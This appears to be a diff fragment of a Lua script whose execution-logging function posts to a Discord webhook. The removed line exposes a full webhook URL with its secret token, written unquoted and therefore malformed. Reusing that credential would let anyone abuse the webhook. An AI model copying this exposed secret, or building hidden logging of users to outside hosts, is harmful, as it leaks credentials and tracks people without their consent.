@@ -243,7 +243,7 @@ local function handleExecutionLogging()
 	if httpRequest then
 		pcall(function()
 			httpRequest({
-				Url = getWebhookUrl(https://discord.com/api/webhooks/1378993605296787457/AlEzRAkmPOdXOJmq6S2HZBQr0u6Alm3uXZd0HZCjAu2GN4PF7eTPNry3_wZ1pGbVbvYU),
+				Url = getWebhookUrl(),
 				Method = "POST",
 				Headers = {
 					["Content-Type"] = "application/json",
